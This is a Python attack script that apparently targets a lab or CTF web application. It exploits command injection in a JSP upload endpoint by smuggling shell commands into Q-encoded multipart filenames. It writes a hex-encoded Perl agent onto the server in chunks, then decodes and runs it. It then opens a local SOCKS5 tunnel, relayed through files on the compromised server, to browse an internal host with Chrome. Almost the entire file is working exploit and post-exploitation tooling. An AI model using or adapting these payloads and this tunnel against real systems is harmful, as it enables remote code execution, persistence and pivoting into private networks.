#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket, threading, time, requests, os, binascii, random, argparse, sys, subprocess, shutil

# ===== User defaults =====
BASE_DEFAULT = "http://YOUR_IP:8080"  # NEED CHANGE  where upload.jsp / download.jsp live
SOCKS_HOST   = "127.0.0.1"
SOCKS_PORT_DEFAULT = 1080
AUTOGET_DEFAULT = True
OPEN_DEFAULT     = False  # if True, allow all host:port (not recommended)
LAUNCH_DEFAULT   = True
BROWSER_URL_DEFAULT = "http://172.18.0.2:5000/"  # robust (no local DNS needed)

TIMEOUT  = 6
BOUNDARY = "----cmdi{}".format(random.randint(100000, 999999))

# server-side working dir nav without / or \ (validated pattern)
PREFIX = "a', cd ..; cd webapps; cd ROOT; cd uploads; "
SUFFIX = "; echo '"

# Verified encoded-words for decode & run (do not change unless you re-test on target)
DECODE_ENC = "=?UTF-8?Q?a=27=2C_cd_=2E=2E=3B_cd_webapps=3B_cd_ROOT=3B_cd_uploads=3B_perl_=2De_=27open_I=2C=22agentx=22=3Bread_I=2C=24d=2C=2Ds_I=3Bopen_O=2C=22=3Eagent=2Epl=22=3Bbinmode_O=3Bprint_O_pack=28=22H=2A=22=2C=24d=29=3Bclose_O=3B=27=3B_echo_=27?="
RUN_ENC    = "=?UTF-8?Q?a=27=2C_cd_=2E=2E=3B_cd_webapps=3B_cd_ROOT=3B_cd_uploads=3B_perl_agent.pl=3B_echo_=27?="

# conservative allowlist by default
ALLOWED_HOSTS = {"internal_web", "172.18.0.2"}
ALLOWED_PORTS = {5000}

def qencode(s: str) -> str:
    out = []
    for b in s.encode("utf-8"):
        if 48 <= b <= 57 or 65 <= b <= 90 or 97 <= b <= 122:
            out.append(chr(b))
        elif b == 0x20:
            out.append("_")
        else:
            out.append("={:02X}".format(b))
    return "=?UTF-8?Q?{}?=".format("".join(out))

def post_filename_encoded(base, encoded_word: str, body: bytes=b"X", cookies: dict=None):
    upload = base + "/upload.jsp"
    headers = {"Content-Type": f"multipart/form-data; boundary={BOUNDARY}"}
    parts = []
    parts.append(f"--{BOUNDARY}\r\n".encode())
    parts.append(b'Content-Disposition: form-data; name="file"; filename="')
    parts.append(encoded_word.encode()); parts.append(b'"\r\n')
    parts.append(b"Content-Type: application/octet-stream\r\n\r\n")
    parts.append(body); parts.append(b"\r\n--")
    parts.append(BOUNDARY.encode()); parts.append(b"--\r\n")
    data = b"".join(parts)
    try:
        requests.post(upload, data=data, headers=headers, timeout=TIMEOUT, cookies=cookies or {})
    except Exception:
        pass

def post_cmd(base, cmd: str, body: bytes=b"X", cookies: dict=None):
    payload = qencode(PREFIX + cmd + SUFFIX)
    post_filename_encoded(base, payload, body=body, cookies=cookies)

def read_file(base, fname, cookies=None):
    dl = f"{base}/download.jsp?file={fname}"
    try:
        r = requests.get(dl, timeout=TIMEOUT, cookies=cookies or {})
        return r.status_code, r.content
    except Exception:
        return None, b""

# ===== Bootstrap (agent.pl upload -> decode -> run) =====
def bootstrap_agent(base, cookies=None, agent_path="agent.pl"):
    if not os.path.exists(agent_path):
        print(f"[!] agent.pl not found next to this script: {agent_path}")
        return False

    # reset files on server
    post_cmd(base, ":>in.hex; :>out.hex; :>agentx", cookies=cookies)
    time.sleep(0.1)

    # upload hex chunks of local agent.pl into uploads/agentx
    hex_body = open(agent_path, "rb").read().hex()
    sent = 0
    for i in range(0, len(hex_body), 220):
        piece = hex_body[i:i+220]
        cmd = "perl -e 'open F,\">>agentx\";print F q{" + piece + "};close F'"
        post_cmd(base, cmd, cookies=cookies); sent += len(piece); time.sleep(0.03)
    print(f"[+] uploaded {sent} hex chars into uploads/agentx")

    # decode -> agent.pl
    post_filename_encoded(base, DECODE_ENC, cookies=cookies); time.sleep(0.5)
    # run agent
    post_filename_encoded(base, RUN_ENC, cookies=cookies);    time.sleep(0.6)

    # verify agent presence (HTTP 200 and non-empty)
    code, body = read_file(base, "agent.pl", cookies=cookies)
    print(f"[check] agent.pl HTTP={code} size={0 if body is None else len(body)}")
    ok = (code == 200 and body and len(body) > 0)

    # quick probe marker (optional)
    post_cmd(base, "perl -e 'open F,\">probe.txt\"; print F q{OK}; close F'", cookies=cookies)
    pcode, pbody = read_file(base, "probe.txt", cookies=cookies)
    print(f"[probe uploads] {pcode} '{(pbody or b'')[:16].decode('utf-8','ignore')}'")
    return ok

# ===== SOCKS5 guarded proxy =====
single_conn_lock = threading.Lock()

def send_socks_reply(c: socket.socket, rep: int):
    # version=5, REP=rep, RSV=0, ATYP=1, BND=0.0.0.0:0
    c.sendall(b"\x05" + bytes([rep]) + b"\x00\x01\x00\x00\x00\x00\x00\x00")

def synthetic_http_204(c: socket.socket):
    try:
        send_socks_reply(c, 0x00)
        c.sendall(b"HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
    except Exception:
        pass
    try: c.close()
    except: pass

class Socks5OneShot(threading.Thread):
    def __init__(self, base, host="127.0.0.1", port=1080, cookies=None, autoget=True, open_mode=False):
        super().__init__(daemon=True)
        self.base = base
        self.host = host; self.port = port
        self.cookies = cookies or {}
        self.autoget = autoget
        self.open_mode = open_mode

    def read_file(self, fname):
        return read_file(self.base, fname, cookies=self.cookies)

    def write_in(self, line: str):
        cmd = "perl -e 'open F,\">>in.hex\";print F q{" + line + "};print F chr(10);close F'"
        post_cmd(self.base, cmd, cookies=self.cookies)

    def run(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.host, self.port)); s.listen(64)
            print(f"[+] SOCKS5 (one-shot) on {self.host}:{self.port}  autoget={self.autoget}  open={self.open_mode}")
            while True:
                c, addr = s.accept()
                threading.Thread(target=self.handle, args=(c,addr), daemon=True).start()

    def handle(self, c: socket.socket, addr):
        try:
            h = c.recv(2)
            if len(h) < 2: c.close(); return
            nmethods = h[1]; _ = c.recv(nmethods); c.sendall(b"\x05\x00")

            hdr = c.recv(4)
            if len(hdr) < 4: send_socks_reply(c, 7); c.close(); return
            ver, cmd, _, atyp = hdr
            if cmd != 1:  # only CONNECT
                print("[guard] non-CONNECT rejected"); send_socks_reply(c, 7); c.close(); return

            if atyp == 1:
                dst = socket.inet_ntoa(c.recv(4))
            elif atyp == 3:
                l = c.recv(1)[0]; dst = c.recv(l).decode("utf-8","ignore")
            elif atyp == 4:
                dst = socket.inet_ntop(socket.AF_INET6, c.recv(16))
            else:
                send_socks_reply(c, 7); c.close(); return
            port = int.from_bytes(c.recv(2), "big")

            # Normalize stale IP -> service name (docker restarts)
            orig_dst = dst
            if dst == "172.18.0.2":
                dst = "internal_web"

            print(f"[req] {addr} -> {orig_dst}:{port}  (Cframe host={dst})")

            # Allowlist unless open mode
            if not self.open_mode:
                if dst not in ALLOWED_HOSTS or port not in ALLOWED_PORTS:
                    print(f"[guard] reject by ruleset: {dst}:{port} (orig {orig_dst})")
                    send_socks_reply(c, 2); c.close(); return

            # single remote socket (protect agent)
            if not single_conn_lock.acquire(blocking=False):
                print(f"[guard] busy -> synthetic 204 to {dst}:{port}")
                synthetic_http_204(c); return

            try:
                # 0) Truncate out.hex to drop stale frames
                post_cmd(self.base, ":>out.hex", cookies=self.cookies)
                time.sleep(0.08)

                # 1) Send C-frame
                host_hex = binascii.hexlify(dst.encode()).decode()
                hlen_hex = f"{len(dst):02X}"; port_hex = f"{port:04X}"
                print(f"[CFRAME] hlen={hlen_hex} host_hex={host_hex} port_hex={port_hex}")
                self.write_in(f"C {hlen_hex} {host_hex} {port_hex}")

                # 2) Wait for c 01
                ok = False; t0 = time.time()
                while time.time() - t0 < 6.0:
                    code, data = self.read_file("out.hex")
                    if code != 200: time.sleep(0.05); continue
                    txt = data.decode("utf-8","ignore")
                    if "c 01" in txt: ok = True; break
                    time.sleep(0.05)
                if not ok:
                    print("[guard] connect failed (no c 01). tail:")
                    print(txt[-200:] if 'txt' in locals() else "(no out.hex)")
                    send_socks_reply(c, 5); c.close(); return

                # 3) Set read offset to current end (tail new frames only)
                code, data = self.read_file("out.hex")
                off = len(data)
                send_socks_reply(c, 0x00)
                print("[guard] connect OK; start streaming from offset", off)

                # 3.5) autoget if client silent
                sent_up = 0
                def try_autoget():
                    if not self.autoget: return
                    nonlocal sent_up
                    time.sleep(0.5)
                    if sent_up == 0:
                        rq = b"GET / HTTP/1.1\r\nHost: internal_web\r\nConnection: close\r\n\r\n"
                        H = binascii.hexlify(rq).decode()
                        self.write_in(f"D {len(rq):08X} {H}")
                        sent_up += len(rq)
                        print("[autoget] injected GET / (fallback)")
                if self.autoget:
                    threading.Thread(target=try_autoget, daemon=True).start()

                # RX: server -> client
                def rx():
                    nonlocal off
                    while True:
                        code, data = self.read_file("out.hex")
                        if code != 200: time.sleep(0.04); continue
                        if off >= len(data): time.sleep(0.02); continue
                        chunk = data[off:]; off = len(data)
                        txt = chunk.decode("utf-8","ignore")
                        for ln in txt.splitlines():
                            ln = ln.strip()
                            if ln.startswith("d "):
                                try:
                                    _, L, H = ln.split()
                                    c.sendall(binascii.unhexlify(H))
                                except Exception:
                                    return
                            elif ln == "x":
                                try: c.shutdown(socket.SHUT_WR)
                                except: pass
                                return
                        time.sleep(0.01)
                threading.Thread(target=rx, daemon=True).start()

                # TX: client -> server
                total = 0
                while True:
                    data = c.recv(4096)
                    if not data:
                        self.write_in("X"); break
                    total += len(data)
                    H = binascii.hexlify(data).decode()
                    self.write_in(f"D {len(data):08X} {H}")
                    print(f"[TX] {len(data)} bytes upstream (total {total})")
                print(f"[TX done] sent {total} bytes upstream")
                c.close()

            finally:
                try: single_conn_lock.release()
                except: pass

        except Exception as e:
            print("[guard] exception:", e)
            try: c.close()
            except: pass

def find_chrome_path(explicit=None):
    if explicit and os.path.exists(explicit):
        return explicit
    # Common locations
    candidates = []
    pf = os.environ.get("ProgramFiles"); pfx86 = os.environ.get("ProgramFiles(x86)")
    if pf: candidates.append(os.path.join(pf, "Google", "Chrome", "Application", "chrome.exe"))
    if pfx86: candidates.append(os.path.join(pfx86, "Google", "Chrome", "Application", "chrome.exe"))
    # PATH fallback
    on_path = shutil.which("chrome") or shutil.which("chrome.exe")
    if on_path: candidates.insert(0, on_path)
    for c in candidates:
        if c and os.path.exists(c):
            return c
    return None

def wait_port(host, port, deadline=5.0):
    t0 = time.time()
    while time.time() - t0 < deadline:
        try:
            with socket.create_connection((host, port), timeout=0.5):
                return True
        except Exception:
            time.sleep(0.1)
    return False

def launch_chrome(url, socks_host, socks_port, chrome_path=None, new_profile_dir=None, host_rules=None, incognito=True):
    chrome = find_chrome_path(chrome_path)
    if not chrome:
        print("[launch] Chrome not found. Skipping auto-launch.")
        return
    if not new_profile_dir:
        new_profile_dir = os.path.join(os.environ.get("TEMP", os.getcwd()), "ChromeSocks_gui_ok")
    args = [
        chrome,
        f'--user-data-dir={new_profile_dir}',
        '--new-window',
        f'--proxy-server=socks5://{socks_host}:{socks_port}',
    ]
    if incognito:
        args.append('--incognito')
    if host_rules:
        args.append(f'--host-resolver-rules={host_rules}')
    args.append(url)
    try:
        subprocess.Popen(args)
        print("[launch] Chrome started:", " ".join(args[:2]), "...", url)
    except Exception as e:
        print("[launch] failed:", e)

def main():
    ap = argparse.ArgumentParser(description="One-shot CMDi bootstrap + SOCKS5 tunnel + auto-launch Chrome")
    ap.add_argument("--base", default=BASE_DEFAULT, help="Base URL of target (default: %(default)s)")
    ap.add_argument("--port", type=int, default=SOCKS_PORT_DEFAULT, help="Local SOCKS5 port (default: %(default)s)")
    ap.add_argument("--cookie", help="JSESSIONID value if needed", default=None)
    ap.add_argument("--open", action="store_true", help="Disable host/port filtering (allow all)")
    ap.add_argument("--no-autoget", action="store_true", help="Disable autoget")
    ap.add_argument("--no-bootstrap", action="store_true", help="Skip agent bootstrap step")
    ap.add_argument("--no-launch", action="store_true", help="Do not auto-launch Chrome")
    ap.add_argument("--browser-url", default=BROWSER_URL_DEFAULT, help="URL to open after ready (default: %(default)s)")
    ap.add_argument("--chrome-path", default=None, help="Explicit path to chrome.exe")
    ap.add_argument("--host-rules", default=None, help="Value for --host-resolver-rules (optional)")
    args = ap.parse_args()

    cookies = {}
    if args.cookie:
        cookies["JSESSIONID"] = args.cookie

    if not args.no_bootstrap:
        ok = bootstrap_agent(args.base, cookies=cookies, agent_path="agent.pl")
        print("[bootstrap ok]", ok)
        if not ok:
            print("[!] bootstrap failed or agent.pl missing. Exiting."); sys.exit(1)

    srv = Socks5OneShot(
        base=args.base,
        host=SOCKS_HOST,
        port=args.port,
        cookies=cookies,
        autoget=(not args.no_autoget),
        open_mode=args.open
    )
    srv.start()

    # Wait until SOCKS is accepting connections
    if wait_port(SOCKS_HOST, args.port, deadline=5.0):
        print(f"[ready] SOCKS listening on {SOCKS_HOST}:{args.port}")
        if not args.no_launch:
            # If user chose internal_web hostname in URL, suggest host-rules unless already set
            host_rules = args.host_rules
            if ("internal_web" in args.browser_url) and not host_rules:
                # Encourage remote resolution: prevent local DNS from consuming the name
                host_rules = "MAP * ~NOTFOUND , EXCLUDE 127.0.0.1"
            launch_chrome(args.browser_url, SOCKS_HOST, args.port, chrome_path=args.chrome_path, host_rules=host_rules)
    else:
        print("[ready] SOCKS did not start within timeout; skipping browser launch.")

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
